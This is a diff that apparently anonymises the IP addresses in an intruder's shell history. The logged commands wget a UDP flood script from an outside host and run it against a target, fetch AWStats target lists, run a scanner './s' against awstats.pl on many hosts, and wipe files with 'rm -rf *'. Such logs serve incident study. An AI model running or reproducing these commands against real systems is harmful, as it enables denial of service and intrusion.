@@ -92,15 +92,15 @@ w
 ls
 wget
 wget http://www.whoopis.com/howtos/phpbb-viewtopic-hack/udp.txt
-perl udp.txt 199.77.253.180 139 0
-perl udp.txt 199.77.253.180 139 1
+perl udp.txt 21.162.15.18 139 0
+perl udp.txt 21.162.15.18 139 1
 ls
 rm -rf *
 exit
 ls
 mkdir a
 cd a
-wget http://61.121.73.81/~chicken/web/aws
+wget http://226.163.195.188/~chicken/web/aws
 cat aws |grep awstats >done
 cat done |sort |uniq >aws
 ls
@@ -179,12 +179,12 @@ rm -rf lool done aws
 ls
 ps x
 ls
-wget http://61.121.73.81/~chicken/web/aws
+wget http://226.163.195.188/~chicken/web/aws
 ls
 cat aws |grep awstats >unu
 cat unu | sort |uniq >aws
 head aws
-ftp 61.121.73.81
+ftp 226.163.195.188
 ls
 cd a
 ls
@@ -192,7 +192,7 @@ cat facute
 cat bubu
 ls
 ls
-wget http://61.121.73.81/~chicken/web/aws
+wget http://226.163.195.188/~chicken/web/aws
 mv aws.1 aws
 ls
 head aws
@@ -297,13 +297,13 @@ head facute
 cat facute
 head bubu 
 cat bubu 
-./s 224.90.228.103 //cgi-bin/awstats.pl w
-./s 224.90.228.103 //cgi-bin/awstats.pl w
-./s 60.193.210.227 //cgi-bin/awstats.pl w 2
-./s 60.193.210.227 //cgi-bin/awstats.pl w 2
-./s 224.90.228.103 //cgi-bin/awstats.pl w
-./s 66.2.252.243 //awstats/awstats.pl w 
-./s 60.175.126.199 //awstats/awstats.pl w
+./s 108.14.202.185 //cgi-bin/awstats.pl w
+./s 108.14.202.185 //cgi-bin/awstats.pl w
+./s 227.214.98.223 //cgi-bin/awstats.pl w 2
+./s 227.214.98.223 //cgi-bin/awstats.pl w 2
+./s 108.14.202.185 //cgi-bin/awstats.pl w
+./s 102.200.35.11 //awstats/awstats.pl w 
+./s 154.120.30.253 //awstats/awstats.pl w
 ls
 >bubu 
 >facute 
@@ -364,11 +364,11 @@ ls
 cat bubu
 ls
 cat facute |grep 290
-./s 59.73.46.153 //cgi-bin/awstats.pl w
+./s 192.108.119.131 //cgi-bin/awstats.pl w
 cat facute |grep 547
 cat facute |grep 548
-./s 20.211.32.81 //cgi-bin/awstats.pl w
-./s 149.40.244.3 //awstats/awstats.pl w
+./s 89.168.90.188 //cgi-bin/awstats.pl w
+./s 185.127.193.213 //awstats/awstats.pl w
 ls
 head test 
 head done 
